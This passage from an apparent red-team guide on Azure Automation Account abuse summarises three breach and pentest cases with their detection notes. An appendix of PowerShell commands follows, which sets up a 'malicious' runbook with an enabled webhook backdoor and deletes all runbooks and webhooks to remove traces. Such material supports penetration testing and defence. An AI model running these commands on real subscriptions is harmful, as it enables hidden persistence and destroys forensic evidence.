- **Target:** Global bank's Azure subscription
- **Attack Timeline:**
  - Compromised contractor's Office 365 account (weak password)
  - Escalated to Azure Contributor via PIM abuse
  - Created "BackupJob" runbook that exported all SQL databases
  - Runbook ran nightly for 3 months before detection
- **Impact:** 10M+ customer records exfiltrated; regulatory fines
- **Detection:** Triggered by unusual data export pattern in SQL audit logs
- **Reference:** [CISA Alert - Azure Account Takeover](https://www.cisa.gov/)

### Example 2: Ransomware-as-a-Service (RaaS) Group (2024)

- **Target:** Manufacturing company's Azure VMs
- **Technique:** Automation Account runbook that triggered ransomware deployment
- **Persistence:** Webhook-based; attacker could re-trigger at will
- **Impact:** $5M ransom demanded; production downtime for 2 weeks
- **Reference:** [Microsoft 365 Defender Threat Intelligence](https://security.microsoft.com/)

### Example 3: Lab Testing (SERVTEP 2024)

- **Scenario:** Penetration test of Azure subscription
- **Setup:** Created "ConfigUpdate" runbook that escalated backdoor service principal
- **Detection:** Caught within 4 hours by Sentinel rule monitoring runbook creation
- **Lesson:** Without Sentinel rule, would have remained undetected indefinitely
- **Reference:** [SERVTEP Internal Assessment]

---

## APPENDIX: QUICK REFERENCE COMMANDS

### Single-Line Automation Account Takeover
```powershell
# Create malicious runbook and webhook (one command set)
New-AzAutomationRunbook -Name "Maintenance" -Type PowerShell -AutomationAccountName <AA> -ResourceGroupName <RG> -Force
Publish-AzAutomationRunbook -Name "Maintenance" -AutomationAccountName <AA> -ResourceGroupName <RG>
New-AzAutomationWebhook -RunbookName "Maintenance" -Name "Hook1" -AutomationAccountName <AA> -ResourceGroupName <RG> -IsEnabled $true
```

### List All Backdoors
```powershell
Get-AzAutomationWebhook -AutomationAccountName <AA> -ResourceGroupName <RG> | Select-Object Name, CreationTime, ExpiryTime
Get-AzAutomationRunbook -AutomationAccountName <AA> -ResourceGroupName <RG> | Select-Object Name, CreationTime, State
```

### Remove All Traces
```powershell
# Delete all runbooks and webhooks
Get-AzAutomationWebhook -AutomationAccountName <AA> -ResourceGroupName <RG> |
  Remove-AzAutomationWebhook -AutomationAccountName <AA> -ResourceGroupName <RG>

Get-AzAutomationRunbook -AutomationAccountName <AA> -ResourceGroupName <RG> |
  Remove-AzAutomationRunbook -AutomationAccountName <AA> -ResourceGroupName <RG> -Force
```

---